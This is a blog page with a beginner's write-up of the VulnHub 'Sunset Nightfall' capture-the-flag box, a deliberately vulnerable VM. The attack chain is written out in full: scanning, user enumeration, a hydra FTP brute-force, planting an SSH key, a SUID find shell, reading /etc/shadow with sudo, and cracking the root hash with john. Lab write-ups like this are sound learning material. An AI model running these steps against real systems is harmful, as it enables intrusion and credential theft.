<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>VulnHub: Sunset Nightfall | PaperMod</title>
<meta name="keywords" content="" />
<meta name="description" content="My write-up for Nightfall, a VulnHub box created by whitecr0wz.">
<meta name="author" content="Theme PaperMod">
<link rel="canonical" href="/posts/vulnhub-sunset-nightfall/" />
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d0c0348c2d0cff14148d0e347258519d8df2ce53ce5ac32c7bd9a549182cb8ae.css" integrity="sha256-0MA0jC0M/xQUjQ40clhRnY3yzlPOWsMse9mlSRgsuK4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js" integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="apple-touch-icon" href="/apple-touch-icon.png">
<link rel="mask-icon" href="/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.80.0" />
<link rel="alternate" hreflang="en" href="/posts/vulnhub-sunset-nightfall/" />
<meta property="og:title" content="VulnHub: Sunset Nightfall" />
<meta property="og:description" content="My write-up for Nightfall, a VulnHub box created by whitecr0wz." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/vulnhub-sunset-nightfall/" /><meta property="og:image" content="/papermod-cover.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-02-16T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2020-02-16T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="/papermod-cover.png"/>

<meta name="twitter:title" content="VulnHub: Sunset Nightfall"/>
<meta name="twitter:description" content="My write-up for Nightfall, a VulnHub box created by whitecr0wz."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "/posts/"
    }
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "VulnHub: Sunset Nightfall",
      "item": "/posts/vulnhub-sunset-nightfall/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "VulnHub: Sunset Nightfall",
  "name": "VulnHub: Sunset Nightfall",
  "description": "My write-up for Nightfall, a VulnHub box created by whitecr0wz.",
  "keywords": [
    
  ],
  "articleBody": "Here‚Äôs my write-up for Nightfall, a VulnHub box created by whitecr0wz, which is part of the Sunset series.\nWrite-up The description for this box states the following:\nNightfall is a born2root VM designed for beginners. Virtualbox is strongly recommended for doing this challenge. There wasn‚Äôt much to go off there so I ran a port scan using nmap to see what was running:\nkali@kali:~/Documents/vulnhub/nightfall/nmap$ nmap -sV -sC -oA nmap 10.0.2.19 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-09 13:48 EST Nmap scan report for 10.0.2.19 Host is up (0.00016s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp pyftpdlib 1.5.5 | ftp-syst: | STAT: | FTP server status: | Connected to: 10.0.2.19:21 | Waiting for username. | TYPE: ASCII; STRUcture: File; MODE: Stream | Data connection closed. |_End of status. 22/tcp open ssh OpenSSH 7.9p1 Debian 10 (protocol 2.0) | ssh-hostkey: | 2048 a9:25:e1:4f:41:c6:0f:be:31:21:7b:27:e3:af:49:a9 (RSA) | 256 38:15:c9:72:9b:e0:24:68:7b:24:4b:ae:40:46:43:16 (ECDSA) |_ 256 9b:50:3b:2c:48:93:e1:a6:9d:b4:99:ec:60:fb:b6:46 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Apache2 Debian Default Page: It works 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) 3306/tcp open mysql MySQL 5.5.5-10.3.15-MariaDB-1 | mysql-info: | Protocol: 10 | Version: 5.5.5-10.3.15-MariaDB-1 | Thread ID: 15 | Capabilities flags: 63486 | Some Capabilities: Support41Auth, ConnectWithDatabase, DontAllowDatabaseTableColumn, FoundRows, SupportsCompression, SupportsLoadDataLocal, ODBCClient, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, InteractiveClient, LongColumnFlag, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments | Status: Autocommit | Salt: \\n5]Rd~n/That‚Äôs a lot of services! FTP, SSH, Apache HTTP Server, something called ‚ÄúSamba‚Äù (I‚Äôd not heard of this service before now) and MySQL. I started with port 80, opening up Firefox to see if anything interesting was running.\nIt looks like it‚Äôs a default Apache HTTP Server install. I ran dirb against 10.0.2.19 (the IP for Nightfall) with the default word list to make sure there weren‚Äôt any interesting endpoints hiding but this didn‚Äôt return anything useful:\nkali@kali:~/Documents/vulnhub/nightfall/nmap$ dirb http://10.0.2.19 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Mon Feb 09 13:51:20 2020 URL_BASE: http://10.0.2.19/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://10.0.2.19/ ---- + http://10.0.2.19/index.html (CODE:200|SIZE:10701) + http://10.0.2.19/server-status (CODE:403|SIZE:297) ----------------- END_TIME: Mon Feb 09 13:51:25 2020 DOWNLOADED: 4612 - FOUND: 2 Next, I took a look at the FTP server. I tried to log in as an anonymous user but no luck:\nkali@kali:~/Documents/vulnhub/nightfall$ ftp 10.0.2.19 Connected to 10.0.2.19. 220 pyftpdlib 1.5.5 ready. Name (10.0.2.19:kali): anonymous 331 Username ok, send password. Password: 530 Anonymous access not allowed. Login failed. What was curious was that the FTP server wasn‚Äôt vsftpd (what I‚Äôve usually seen in the past), it was something called ‚Äúpyftpdlib‚Äù. I looked into pyftpdlib and found the GitHub repo which states: ‚ÄúPython FTP Server library is a FTP server library providing a portable interface to easily write very efficient asynchronous FTP servers with Python.‚Äù\nI took a look at the releases, as nmap was reporting the version of pyftpdlib to be 1.5:\nIt‚Äôs a few versions out of date so I checked in the GitHub issues and on Exploit DB to see if any exploits had been raised against pyftpdlib but nothing came up.\nTo be honest, that‚Äôs where the story ends for a few days. I was a little overwhelmed by the number of services (still being fairly new to the CTF scene) that could be enumerated and I found myself constantly flipping between services trying to find a way in without a steady aim or trajectory. I took some time away from Nightfall for a bit and given I knew the least about Samba and SMB, that‚Äôs where I started my research. The Samba website states: ‚ÄúSamba is the standard Windows interoperability suite of programs for Linux and Unix. Since 1992, Samba has provided secure, stable and fast file and print services for all clients using the SMB/CIFS protocol, such as all versions of DOS and Windows, OS/2, Linux and many others.‚Äù\nThis particular definition of SMB made the most sense to me: ‚ÄúSMB is a network protocol used by Windows-based computers that allows systems within the same network to share files. It allows computers connected to the same network or domain to access files from other local computers as easily as if they were on the computer‚Äôs local hard drive. Not only does SMB allow computers to share files, but it also enables computers to share printers and even serial ports from other computers within the network. For example, a computer connected to a Windows network could print a document on a printer connected to another computer on the network, as long as both machines support the SMB protocol.‚Äù\nAfter reading a few more articles and skimming several RFCs I had a basic understanding of what Samba and SMB were. Now I wanted to know how to start interacting with a Samba server. As predicted IppSec has a great walkthrough of HackTheBox: Active in which they demonstrate how to use different tools to interrogate Samba/SMB.\nRunning SMBMap didn‚Äôt return anything interesting:\nkali@kali:~$ smbmap -H 10.0.2.19 [+] Finding open SMB ports.... [+] User SMB session established on 10.0.2.19... [+] IP: 10.0.2.19:445 Name: 10.0.2.19 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers IPC$ NO ACCESS IPC Service (Samba 4.9.5-Debian Running enum4linux however, did return something interesting. This tool outputs a lot of information so I‚Äôve stripped out the noise leaving just the interesting lines:\nkali@kali:~/Documents/vulnhub/nightfall$ enum4linux -a 10.0.2.19 ... ... [+] Enumerating users using SID S-1-22-1 and logon username '', password '' S-1-22-1-1000 Unix User\\nightfall (Local User) S-1-22-1-1001 Unix User\\matt (Local User) ... ... I was interested in how enum4linux found these users so that I might understand a bit more on how Samba and SMB work, but within minutes I was down a rabbit hole, reading about the difference between RIDs and a SIDs in Active Directory and RID cycling attacks using null sessions. Given that I had a username to start enumerating the other services with and my knowledge of Windows is minimal, I didn‚Äôt fancy losing my mind with the exact details at this point so I left the fascinating world of Samba/Windows/Active Directory/SID/RID for now, with a todo on my list to spend more time understanding this technology soon.\nI tried to FTP in as matt and I was prompted for a password. I recalled seeing an ftp mode for hydra so I looked into it, found the argument and gave it a go:\nkali@kali:~/Documents/vulnhub/nightfall$ hydra -l matt -P /usr/share/wordlists/rockyou.txt -vV 10.0.2.19 ftp -f ... [ATTEMPT] target 10.0.2.19 - login \"matt\" - pass \"123456\" - 1 of 14344399 [child 0] (0/0) [ATTEMPT] target 10.0.2.19 - login \"matt\" - pass \"12345\" - 2 of 14344399 [child 1] (0/0) [ATTEMPT] target 10.0.2.19 - login \"matt\" - pass \"123456789\" - 3 of 14344399 [child 2] (0/0) [ATTEMPT] target 10.0.2.19 - login \"matt\" - pass \"password\" - 4 of 14344399 [child 3] (0/0) ... After around 30 seconds a password was found:\n... [ATTEMPT] target 10.0.2.19 - login \"matt\" - pass \"cheese\" - 154 of 14344399 [child 7] (0/0) [ATTEMPT] target 10.0.2.19 - login \"matt\" - pass \"159753\" - 155 of 14344399 [child 10] (0/0) [ATTEMPT] target 10.0.2.19 - login \"matt\" - pass \"arsenal\" - 156 of 14344399 [child 11] (0/0) [ATTEMPT] target 10.0.2.19 - login \"matt\" - pass \"dolphin\" - 157 of 14344399 [child 12] (0/0) [ATTEMPT] target 10.0.2.19 - login \"matt\" - pass \"antonio\" - 158 of 14344399 [child 13] (0/0) [ATTEMPT] target 10.0.2.19 - login \"matt\" - pass \"heather\" - 159 of 14344399 [child 14] (0/0) [ATTEMPT] target 10.0.2.19 - login \"matt\" - pass \"david\" - 160 of 14344399 [child 15] (0/0) [21][ftp] host: 10.0.2.19 login: matt password: cheese [STATUS] attack finished for 10.0.2.19 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-15 10:36:46 I logged into the FTP server as matt, using the password cheese, and started looking around:\nkali@kali:~/Documents/vulnhub/nightfall$ ftp 10.0.2.19 Connected to 10.0.2.19. 220 pyftpdlib 1.5.5 ready. Name (10.0.2.19:kali): matt 331 Username ok, send password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp ls 200 Active data connection established. 125 Data connection already open. Transfer starting. -rw------- 1 matt matt 0 Aug 28 22:41 .bash_history -rw-r--r-- 1 matt matt 220 Aug 26 00:34 .bash_logout -rw-r--r-- 1 matt matt 3526 Aug 26 00:34 .bashrc drwx------ 3 matt matt 4096 Aug 28 21:26 .gnupg drwxr-xr-x 3 matt matt 4096 Aug 26 00:42 .local -rw-r--r-- 1 matt matt 807 Aug 26 00:34 .profile -rw------- 1 matt matt 0 Aug 28 22:41 .sh_history 226 Transfer complete. ftp The first thing I noticed was the .gnupg directory but unfortunately I didn‚Äôt find anything exciting in it. Changing directories outside of matt‚Äôs home directory wasn‚Äôt permitted. I was stuck in the home directory but I had read/write permissions. I also knew the box had SSH access so the plan was to exploit that.\nkali@kali:~/Documents/vulnhub/nightfall$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/kali/.ssh/id_rsa): /home/kali/Documents/vulnhub/nightfall/ssh Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/kali/Documents/vulnhub/nightfall/ssh. Your public key has been saved in /home/kali/Documents/vulnhub/nightfall/ssh.pub. kali@kali:~/Documents/vulnhub/nightfall$ cp ssh.pub authorized_keys I created a passwordless keypair on my machine. Once I had the authorized_keys file created (which was just a copy of the ssh public key) I created a .ssh directory in matt‚Äôs home directory and uploaded the authorized_keys file:\nftp mkdir .ssh 257 \"/.ssh\" directory created. ftp cd .ssh 250 \"/.ssh\" is the current directory. ftp put authorized_keys local: authorized_keys remote: authorized_keys 200 Active data connection established. 125 Data connection already open. Transfer starting. 226 Transfer complete. 563 bytes sent in 0.00 secs (204.6927 kB/s) I opened up a new terminal and ssh‚Äôd in as matt, using the private key as the identity file:\nkali@kali:~/Documents/vulnhub/nightfall$ ssh matt@10.0.2.19 -i ssh Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. ... ... matt@nightfall:~$ Once I was logged in as matt I downloaded a copy of LinEnum.sh from my machine (10.0.2.15) and ran it as matt:\nmatt@nightfall:~$ wget http://10.0.2.15:8000/LinEnum.sh ... ... 2020-02-15 10:49:45 (23.4 MB/s) - ‚ÄòLinEnum.sh‚Äô saved [46631/46631] Again, like enum4linux, LinEnum outputs a lot of information, but the interesting bit in all of the noise was here:\nmatt@nightfall:~$ ./LinEnum.sh ... ... [+] Possibly interesting SUID files: -rwsr-sr-x 1 nightfall nightfall 315904 Aug 28 14:31 /scripts/find ... ... This copy of find runs as user nightfall due to the SUID permission on the file. find can execute shell commands (using the -exec flag) and GTFOBins documents a nice one-liner to get a shell via find.\nmatt@nightfall:~$ cd /scripts matt@nightfall:/scripts$ ./find . -exec /bin/sh -p \\; -quit $ whoami nightfall $ cd /home/nightfall $ ls user.txt $ cat user.txt 97fb7140ca325ed96f67be3c9e30083d The first flag was found. To get around having to pivot through matt to user nightfall (and to also get a better shell) I decided to set up ssh the same way I did for matt:\n$ mkdir .ssh $ cd .ssh $ cp /home/matt/.ssh/authorized_keys authorized_keys Once the authorized_keys were in place I could ssh in as nightfall.\nkali@kali:~/Documents/vulnhub/nightfall$ ssh nightfall@10.0.2.19 -i ssh Linux nightfall 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. ... ... nightfall@nightfall:~$ Running LinEnum again (this time as nightfall) flagged something interesting:\nnightfall@nightfall:~$ /home/matt/./LinEnum.sh ... (root) NOPASSWD: /usr/bin/cat ... ‚ÄúWait, does this mean I can run sudo cat as root without a password?‚Äù I thought. Yes:\nnightfall@nightfall:~$ sudo cat /etc/shadow root:$6$JNHsN5GY.jc9CiTg$MjYL9NyNc4GcYS2zNO6PzQNHY2BE/YODBUuqsrpIlpS9LK3xQ6coZs6lonzURBJUDjCRegMHSF5JwCMG1az8k.:18134:0:99999:7::: daemon:*:18126:0:99999:7::: bin:*:18126:0:99999:7::: sys:*:18126:0:99999:7::: sync:*:18126:0:99999:7::: games:*:18126:0:99999:7::: man:*:18126:0:99999:7::: lp:*:18126:0:99999:7::: mail:*:18126:0:99999:7::: news:*:18126:0:99999:7::: uucp:*:18126:0:99999:7::: proxy:*:18126:0:99999:7::: www-data:*:18126:0:99999:7::: backup:*:18126:0:99999:7::: list:*:18126:0:99999:7::: irc:*:18126:0:99999:7::: gnats:*:18126:0:99999:7::: nobody:*:18126:0:99999:7::: _apt:*:18126:0:99999:7::: systemd-timesync:*:18126:0:99999:7::: systemd-network:*:18126:0:99999:7::: systemd-resolve:*:18126:0:99999:7::: messagebus:*:18126:0:99999:7::: avahi-autoipd:*:18126:0:99999:7::: avahi:*:18126:0:99999:7::: saned:*:18126:0:99999:7::: colord:*:18126:0:99999:7::: hplip:*:18126:0:99999:7::: nightfall:$6$u9n0NMGDN2h3/Npy$y/PVdaqMcdobHf4ZPvbrHNFMwMkPWwamWuKGxn2wqJygEC09UNJNb10X0HBK15Hs4ZwyFtdwixyyfu2QEC1U4/:18134:0:99999:7::: systemd-coredump:!!:18126:::::: sshd:*:18126:0:99999:7::: mysql:!:18126:0:99999:7::: matt:$6$2u38Z1fOk8zIC5kO$oSfp/Ic0Uhb9225EdHB63ugob.B58mPuJJ8YpMB9hNaZAoJk9n3rhs9DHobzmsB20E5Yxjqsnn1x.QGKeAmiR1:18134:0:99999:7::: I copied the entry in /etc/shadow for the root user into a text file (root_shadow.txt) and used john the ripper to crack the password:\nkali@kali:~/Documents/vulnhub/nightfall$ sudo john root_shadow.txt Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 2 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance. Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance. Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance. Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance. Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance. Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist miguel2 (root) 1g 0:00:00:09 DONE 2/3 (2020-02-15 11:53) 0.1091g/s 3564p/s 3564c/s 3564C/s miguel2..jesucristo2 Use the \"--show\" option to display all of the cracked passwords reliably Session completed kali@kali:~/Documents/vulnhub/nightfall$ The final step was to switch to the root user, using the cracked password miguel2:\nnightfall@nightfall:~$ su - Password: root@nightfall:~# ls root_super_secret_flag.txt root@nightfall:~# cat root_super_secret_flag.txt Congratulations! Please contact me via twitter and give me some feedback! @whitecr0w1 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- Thank you for playing! - Felipe Winsnes (whitecr0wz) flag{9a5b21fc6719fe33004d66b703d70a39} ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- root@nightfall:~# Final thoughts This was the first time I‚Äôd come face to face with Samba and SMB. I have a lot to learn about Windows (ugh) and some of the common services found running on Windows (ugh) but I‚Äôm happy the gaps in my knowledge didn‚Äôt stop me from completing this box. Nightfall was an interesting challenge that forced me to step away for a few days, do my research, and come back with a plan.\n",
  "wordCount" : "2321",
  "inLanguage": "en",
  "datePublished": "2020-02-16T00:00:00Z",
  "dateModified": "2020-02-16T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Theme PaperMod"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/posts/vulnhub-sunset-nightfall/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "PaperMod",
    "logo": {
      "@type": "ImageObject",
      "url": "/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>
<noscript>
    <style type="text/css">
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: #1d1e20;
                --entry: #2e2e33;
                --primary: rgba(255, 255, 255, 0.84);
                --secondary: rgba(255, 255, 255, 0.56);
                --tertiary: rgba(255, 255, 255, 0.16);
                --content: rgba(255, 255, 255, 0.74);
                --hljs-bg: #2e2e33;
                --code-bg: #37383e;
                --border: #333;
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="/" accesskey="h" title="PaperMod (Alt + H)">PaperMod</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
                <ul class="lang-switch"><li>|</li>
                    <li>
                        <a href="/fr/" title="French"
                            aria-label=":fr:">üá´üá∑</a>
                    </li>
                    <li>
                        <a href="/fa/" title="Fa"
                            aria-label="Fa">Fa</a>
                    </li>
                </ul>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="/search/" title="Search">
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="/">Home</a>&nbsp;¬ª&nbsp;<a href="/posts/">Posts</a></div>
    <h1 class="post-title">
      VulnHub: Sunset Nightfall
    </h1>
    <div class="post-description">
      My write-up for Nightfall, a VulnHub box created by whitecr0wz.
    </div>
    <div class="post-meta">February 16, 2020&nbsp;¬∑&nbsp;11 min&nbsp;¬∑&nbsp;Theme PaperMod&nbsp;|&nbsp;<a href="https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content/posts/vulnhub-sunset-nightfall.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <div class="details">Table of Contents</div>
        </summary>
        <div class="inner"><ul>
                <li>
                    <a href="#write-up" aria-label="Write-up">Write-up</a></li>
                <li>
                    <a href="#final-thoughts" aria-label="Final thoughts">Final thoughts</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p>Here&rsquo;s my write-up for <a href="https://www.vulnhub.com/entry/sunset-nightfall,355/">Nightfall</a>, a VulnHub box created by whitecr0wz, which is part of the <a href="https://www.vulnhub.com/series/sunset,225/">Sunset</a> series.</p>
<h3 id="write-up">Write-up<a hidden class="anchor" aria-hidden="true" href="#write-up">#</a></h3>
<p>The description for this box states the following:</p>
<pre><code>Nightfall is a born2root VM designed for beginners. Virtualbox is strongly recommended for doing this challenge.
</code></pre><p>There wasn&rsquo;t much to go off there so I ran a port scan using nmap to see what was running:</p>
<pre><code>kali@kali:~/Documents/vulnhub/nightfall/nmap$ nmap -sV -sC -oA nmap 10.0.2.19
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-09 13:48 EST
Nmap scan report for 10.0.2.19
Host is up (0.00016s latency).
Not shown: 994 closed ports                                                                                                                                                                                                               
PORT     STATE SERVICE     VERSION                                                                                                                                                                                                        
21/tcp   open  ftp         pyftpdlib 1.5.5                                                                                                                                                                                                
| ftp-syst:                                                                                                                                                                                                                               
|   STAT:                                                                                                                                                                                                                                 
| FTP server status:                                                                                                                                                                                                                      
|  Connected to: 10.0.2.19:21                                                                                                                                                                                                             
|  Waiting for username.                                                                                                                                                                                                                  
|  TYPE: ASCII; STRUcture: File; MODE: Stream                                                                                                                                                                                             
|  Data connection closed.                                                                                                                                                                                                                
|_End of status.                                                                                                                                                                                                                          
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10 (protocol 2.0)                                                                                                                                                                         
| ssh-hostkey:                                                                                                                                                                                                                            
|   2048 a9:25:e1:4f:41:c6:0f:be:31:21:7b:27:e3:af:49:a9 (RSA)                                                                                                                                                                            
|   256 38:15:c9:72:9b:e0:24:68:7b:24:4b:ae:40:46:43:16 (ECDSA)                                                                                                                                                                           
|_  256 9b:50:3b:2c:48:93:e1:a6:9d:b4:99:ec:60:fb:b6:46 (ED25519)                                                                                                                                                                         
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))                                                                                                                                                                                 
|_http-server-header: Apache/2.4.38 (Debian)                                                                                                                                                                                              
|_http-title: Apache2 Debian Default Page: It works                                                                                                                                                                                       
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                                                                                                                    
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)                                                                                                                                                                 
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1                                                                                                                                                                                  
| mysql-info:                                                                                                                                                                                                                             
|   Protocol: 10                                                                                                                                                                                                                          
|   Version: 5.5.5-10.3.15-MariaDB-1                                                                                                                                                                                                      
|   Thread ID: 15                                                                                                                                                                                                                         
|   Capabilities flags: 63486                                                                                                                                                                                                             
|   Some Capabilities: Support41Auth, ConnectWithDatabase, DontAllowDatabaseTableColumn, FoundRows, SupportsCompression, SupportsLoadDataLocal, ODBCClient, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, InteractiveClient, LongColumnFlag, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments                                                                                                
|   Status: Autocommit                                                                                                                                                                                                                    
|   Salt: \n5]Rd~n/&lt;}%:5=qA3v|                                                                                                                                                                                                            
|_  Auth Plugin Name: mysql_native_password                                                                                                                                                                                               
Service Info: Host: NIGHTFALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                                  
                                                                                                                                                                                                                                          
Host script 
results:
...
...                                   
</code></pre><p>That&rsquo;s a lot of services! FTP, SSH, Apache HTTP Server, something called &ldquo;Samba&rdquo; (I&rsquo;d not heard of this service before now) and MySQL. I started with port 80, opening up Firefox to see if anything interesting was running.</p>
<p><img loading="lazy" src="/static/sunrise-nightfall/1.png" alt=""  />
</p>
<p>It looks like it&rsquo;s a default Apache HTTP Server install. I ran <code>dirb</code> against 10.0.2.19 (the IP for Nightfall) with the default word list to make sure there weren&rsquo;t any interesting endpoints hiding but this didn&rsquo;t return anything useful:</p>
<pre><code>kali@kali:~/Documents/vulnhub/nightfall/nmap$ dirb http://10.0.2.19
                                                                                                                                                                                                                                          
-----------------                                                                                                                                                                                                                         
DIRB v2.22                                                                                                                                                                                                                                
By The Dark Raver                                                                                                                                                                                                                         
-----------------                                                                                                                                                                                                                         
                                                                                                                                                                                                                                          
START_TIME: Mon Feb 09 13:51:20 2020                                                                                                                                                                                              
URL_BASE: http://10.0.2.19/                                                                                                                                                                                                               
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt                                                                                                                                                                                      
                                                                                                                                                                                                                                          
-----------------                                                                                                                                                                                                                         
                                                                                                                                                                                                                                          
GENERATED WORDS: 4612                                                                                                                                                                                                                     
                                                                                                                                                                                                                                          
---- Scanning URL: http://10.0.2.19/ ----                                                                                                                                                                                                 
+ http://10.0.2.19/index.html (CODE:200|SIZE:10701)                                                                                                                                                                                       
+ http://10.0.2.19/server-status (CODE:403|SIZE:297)                                                                                                                                                                                      
                                                                                                                                                                                                                                          
-----------------                                                                                                                                                                                                                         
END_TIME: Mon Feb 09 13:51:25 2020
DOWNLOADED: 4612 - FOUND: 2
</code></pre><p>Next, I took a look at the FTP server. I tried to log in as an anonymous user but no luck:</p>
<pre><code>kali@kali:~/Documents/vulnhub/nightfall$ ftp 10.0.2.19
Connected to 10.0.2.19.
220 pyftpdlib 1.5.5 ready.
Name (10.0.2.19:kali): anonymous
331 Username ok, send password.
Password:
530 Anonymous access not allowed.
Login failed.
</code></pre><p>What was curious was that the FTP server wasn&rsquo;t vsftpd (what I&rsquo;ve usually seen in the past), it was something called &ldquo;pyftpdlib&rdquo;. I looked into pyftpdlib and found the GitHub repo which states: &ldquo;Python FTP Server library is a FTP server library providing a portable interface to easily write very efficient asynchronous FTP servers with Python.&rdquo;</p>
<p>I took a look at the releases, as nmap was reporting the version of pyftpdlib to be 1.5:</p>
<p><img loading="lazy" src="/static/sunrise-nightfall/2.png" alt=""  />
</p>
<p>It&rsquo;s a few versions out of date so I checked in the GitHub issues and on Exploit DB to see if any exploits had been raised against pyftpdlib but nothing came up.</p>
